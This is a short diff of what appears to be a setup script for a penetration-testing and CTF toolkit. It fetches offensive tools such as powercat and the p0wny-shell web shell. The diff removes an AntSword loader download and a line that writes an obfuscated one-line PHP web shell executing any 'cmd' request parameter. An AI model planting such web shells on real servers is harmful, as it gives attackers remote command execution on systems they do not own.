@@ -115,11 +115,6 @@ wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
 cd ~
 mkdir -p Tools/web && cd Tools/web
 wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
-wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip
-unzip AntSword-Loader-v4.0.3-linux-x64.zip
-rm -rf AntSword-Loader-v4.0.3-linux-x64.zip
-mv AntSword-Loader-v4.0.3-linux-x64 AntSword
-echo "<?php class G16f8j67 { public function __construct($H6nC8){ @eval("/*Z5934A463v*/".$H6nC8.""); }}new G16f8j67($_REQUEST['cmd']);?>" > ant.php
 sleep 1
 wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py
 
@@ -128,7 +123,7 @@ cd ~
 mkdir -p Tools/ctf && cd Tools/ctf
 git clone https://github.com/urbanadventurer/username-anarchy.git
 wget https://raw.githubusercontent.com/ius/rsatool/master/rsatool.py
-git clone https://github.com/RsaCtfTool/RsaCtfTool.git
+git clone https://github.com/Heisenberk/rsa-ctf-tool.git
 
 sleep 2
 clear
